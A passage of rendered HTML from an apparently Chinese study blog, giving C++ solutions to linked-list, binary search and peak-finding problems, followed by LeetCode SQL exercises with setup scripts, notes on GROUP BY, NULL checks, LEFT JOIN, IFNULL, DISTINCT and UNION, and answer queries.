cur;</span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    preHead = preHead-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                cur = cur-&gt;next;</span><br><span class="line">                pre = pre-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre-&gt;val == tmp)&#123;</span><br><span class="line">            preHead-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> originPreHead-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h2 id="查找与排序"   >
          <a href="#查找与排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找与排序" class="headerlink" title="查找与排序"></a>查找与排序</h2>
      
        <h3 id="二分查找-2"   >
          <a href="#二分查找-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#二分查找-2" class="headerlink" title="二分查找"></a>二分查找</h3>
      <p>注意边界性问题</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>* nums, <span class="keyword">int</span> numsLen, <span class="keyword">int</span> target )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> r = numsLen - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = (l + r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span>(r &gt;= l)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target)&#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &lt; target)&#123;</span><br><span class="line">            l = mid + <span class="number">1</span>;</span><br><span class="line">            mid = (mid+<span class="number">1</span> + r) / <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            r = mid - <span class="number">1</span>;</span><br><span class="line">            mid = (l + mid<span class="number">-1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="寻找峰值"   >
          <a href="#寻找峰值" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找峰值" class="headerlink" title="寻找峰值"></a>寻找峰值</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221109192943739.png" alt="image-20221109192943739"></p>
<p>采用二分查找，依据<code>mid</code>来更改<code>right</code>和<code>left</code>缩小范围，直至找到峰值</p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param nums int整型vector</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findPeakElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> r = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">int</span> mid = (l + r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &gt; nums[mid+<span class="number">1</span>])&#123;</span><br><span class="line">                r = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> l;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h1 id="数据库"   >
          <a href="#数据库" class="heading-link"><i class="fas fa-link"></i></a><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h1>
      <p>例题均来源于<code>Leetcode</code></p>

        <h2 id="游戏玩法分析I"   >
          <a href="#游戏玩法分析I" class="heading-link"><i class="fas fa-link"></i></a><a href="#游戏玩法分析I" class="headerlink" title="游戏玩法分析I"></a>游戏玩法分析I</h2>
      <p>创建语句</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Activity (player_id <span class="type">int</span>, device_id <span class="type">int</span>, event_date <span class="type">date</span>, games_played <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Activity;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2016-03-01&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2016-05-02&#x27;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2017-06-25&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2016-03-02&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2018-07-03&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103160948765.png" alt="image-20221103160948765"></p>

        <h3 id="知识点："   >
          <a href="#知识点：" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="group聚合"   >
          <a href="#group聚合" class="heading-link"><i class="fas fa-link"></i></a><a href="#group聚合" class="headerlink" title="group聚合"></a>group聚合</h4>
      <p>基于<code>group by</code>之后的列字段进行相同值的聚合，当查询多个列时，通常需要进行排序，所以也需要对相关数据进行值判定</p>

        <h3 id="代码："   >
          <a href="#代码：" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3>
      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">    player_id,</span><br><span class="line">    <span class="built_in">min</span>(event_date) first_login</span><br><span class="line"><span class="keyword">FROM</span> Activity</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id</span><br></pre></td></tr></table></div></figure>


        <h2 id="寻找用户推荐人"   >
          <a href="#寻找用户推荐人" class="heading-link"><i class="fas fa-link"></i></a><a href="#寻找用户推荐人" class="headerlink" title="寻找用户推荐人"></a>寻找用户推荐人</h2>
      <p>创建语句：</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Customer (id <span class="type">int</span>, name <span class="type">varchar</span>(<span class="number">25</span>), referee_id <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Customer;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;Will&#x27;</span>, <span class="string">&#x27;None&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;Jane&#x27;</span>, <span class="string">&#x27;None&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;Alex&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;Bill&#x27;</span>, <span class="string">&#x27;None&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;Zack&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Customer (id, name, referee_id) <span class="keyword">values</span> (<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;Mark&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103120439335.png" alt="image-20221103120439335"></p>

        <h3 id="知识点：-1"   >
          <a href="#知识点：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="NULL值判定"   >
          <a href="#NULL值判定" class="heading-link"><i class="fas fa-link"></i></a><a href="#NULL值判定" class="headerlink" title="NULL值判定"></a>NULL值判定</h4>
      <p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/find-customer-referee/solution/xun-zhao-yong-hu-tui-jian-ren-by-leetcode/" >寻找用户推荐人 - 寻找用户推荐人 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>MySQL 使用三值逻辑 —— TRUE, FALSE 和 UNKNOWN。任何与 NULL 值进行的比较都会与第三种值UNKNOWN做比较。这个“任何值”包括 NULL 本身！这就是为什么 MySQL 提供 IS NULL 和 IS NOT NULL 两种操作来对 NULL 特殊判断。</p>

        <h3 id="代码：-1"   >
          <a href="#代码：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name FROM customer WHERE referee_id != 2 OR referee_id IS NULL;</span><br></pre></td></tr></table></div></figure>




        <h2 id="市场分析I"   >
          <a href="#市场分析I" class="heading-link"><i class="fas fa-link"></i></a><a href="#市场分析I" class="headerlink" title="市场分析I"></a>市场分析I</h2>
      <p>创建语句：</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Users (user_id <span class="type">int</span>, join_date <span class="type">date</span>, favorite_brand <span class="type">varchar</span>(<span class="number">10</span>));</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Orders (order_id <span class="type">int</span>, order_date <span class="type">date</span>, item_id <span class="type">int</span>, buyer_id <span class="type">int</span>, seller_id <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Items (item_id <span class="type">int</span>, item_brand <span class="type">varchar</span>(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Users;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Users (user_id, join_date, favorite_brand) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2018-01-01&#x27;</span>, <span class="string">&#x27;Lenovo&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Users (user_id, join_date, favorite_brand) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2018-02-09&#x27;</span>, <span class="string">&#x27;Samsung&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Users (user_id, join_date, favorite_brand) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2018-01-19&#x27;</span>, <span class="string">&#x27;LG&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Users (user_id, join_date, favorite_brand) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2018-05-21&#x27;</span>, <span class="string">&#x27;HP&#x27;</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Orders;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-08-01&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2018-08-02&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2019-08-03&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2018-08-04&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2018-08-04&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Orders (order_id, order_date, item_id, buyer_id, seller_id) <span class="keyword">values</span> (<span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2019-08-05&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Items;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Items (item_id, item_brand) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;Samsung&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Items (item_id, item_brand) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;Lenovo&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Items (item_id, item_brand) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;LG&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Items (item_id, item_brand) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;HP&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103161138352.png" alt="image-20221103161138352"></p>

        <h3 id="知识点：-2"   >
          <a href="#知识点：-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-2" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="left-join："   >
          <a href="#left-join：" class="heading-link"><i class="fas fa-link"></i></a><a href="#left-join：" class="headerlink" title="left join："></a>left join：</h4>
      <p>以左表为基础，从右表中选择对应条件的数据添加。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table1 left join table2</span><br></pre></td></tr></table></div></figure>

<p>这里即以<code>table1</code>为基础，从<code>table2</code>中选择对应条件数据</p>

        <h4 id="ifnull-x1-x2-函数："   >
          <a href="#ifnull-x1-x2-函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#ifnull-x1-x2-函数：" class="headerlink" title="ifnull(x1,x2)函数："></a>ifnull(x1,x2)函数：</h4>
      <p>如果 <code>x1</code> 为 <code>NULL</code>， 返回 <code>x2</code>，否则返回 <code>x1</code>。</p>

        <h3 id="代码：-2"   >
          <a href="#代码：-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：-2" class="headerlink" title="代码："></a>代码：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	users.user_id AS buyer_id,</span><br><span class="line">	users.join_date,</span><br><span class="line">	IFNULL(userBy.cnt,0) AS orders_in_2019</span><br><span class="line">FROM users</span><br><span class="line">LEFT JOIN(</span><br><span class="line">SELECT </span><br><span class="line">	buyer_id,</span><br><span class="line">	COUNT(buyer_id) AS cnt</span><br><span class="line">FROM orders</span><br><span class="line">WHERE orders.`order_date` BETWEEN &#x27;2019-01-01&#x27; AND &#x27;2019-12-31&#x27;</span><br><span class="line">GROUP BY buyer_id</span><br><span class="line">)userBy</span><br><span class="line">ON users.user_id = userBy.buyer_id</span><br></pre></td></tr></table></div></figure>


        <h2 id="查询近30天活跃用户数"   >
          <a href="#查询近30天活跃用户数" class="heading-link"><i class="fas fa-link"></i></a><a href="#查询近30天活跃用户数" class="headerlink" title="查询近30天活跃用户数"></a>查询近30天活跃用户数</h2>
      <p>创建语句：</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Activity (user_id <span class="type">int</span>, session_id <span class="type">int</span>, activity_date <span class="type">date</span>, activity_type ENUM(<span class="string">&#x27;open_session&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>, <span class="string">&#x27;scroll_down&#x27;</span>, <span class="string">&#x27;send_message&#x27;</span>));</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Activity;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-07-20&#x27;</span>, <span class="string">&#x27;open_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-07-20&#x27;</span>, <span class="string">&#x27;scroll_down&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-07-20&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2019-07-20&#x27;</span>, <span class="string">&#x27;open_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;send_message&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;open_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;send_message&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2019-07-21&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2019-06-25&#x27;</span>, <span class="string">&#x27;open_session&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (user_id, session_id, activity_date, activity_type) <span class="keyword">values</span> (<span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2019-06-25&#x27;</span>, <span class="string">&#x27;end_session&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103161349643.png" alt="image-20221103161349643"></p>

        <h3 id="知识点：-3"   >
          <a href="#知识点：-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-3" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="DISTINCT："   >
          <a href="#DISTINCT：" class="heading-link"><i class="fas fa-link"></i></a><a href="#DISTINCT：" class="headerlink" title="DISTINCT："></a>DISTINCT：</h4>
      <p>去重，直接当作函数用即可</p>

        <h3 id="代码：-3"   >
          <a href="#代码：-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码：-3" class="headerlink" title="代码："></a>代码：</h3>
      <figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">	Activity.`activity_date` <span class="keyword">AS</span> `<span class="keyword">day</span>`,</span><br><span class="line">	<span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span>(Activity.`user_id`)) <span class="keyword">AS</span> active_users</span><br><span class="line"><span class="keyword">FROM</span> Activity</span><br><span class="line"><span class="keyword">WHERE</span> Activity.`activity_date` <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-06-28&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-07-27&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Activity.`activity_date`</span><br></pre></td></tr></table></div></figure>




        <h2 id="树节点"   >
          <a href="#树节点" class="heading-link"><i class="fas fa-link"></i></a><a href="#树节点" class="headerlink" title="树节点"></a>树节点</h2>
      <p>创建语句：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE IF NOT EXISTS Tree (id INT, p_id INT);</span><br><span class="line">TRUNCATE TABLE Tree;</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;1&#x27;, &#x27;None&#x27;);</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;2&#x27;, &#x27;1&#x27;);</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;3&#x27;, &#x27;1&#x27;);</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;4&#x27;, &#x27;2&#x27;);</span><br><span class="line">INSERT INTO Tree (id, p_id) VALUES (&#x27;5&#x27;, &#x27;2&#x27;);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103172919993.png" alt="image-20221103172919993"></p>

        <h3 id="知识点：-4"   >
          <a href="#知识点：-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-4" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="union联合查询："   >
          <a href="#union联合查询：" class="heading-link"><i class="fas fa-link"></i></a><a href="#union联合查询：" class="headerlink" title="union联合查询："></a><code>union</code>联合查询：</h4>
      <p>将多个查询语句联合起来</p>
<p>这里首先分类为根节点、叶子节点、内部节点</p>
<ul>
<li><p>根节点：</p>
<p>是父节点为<code>NULL</code>的</p>
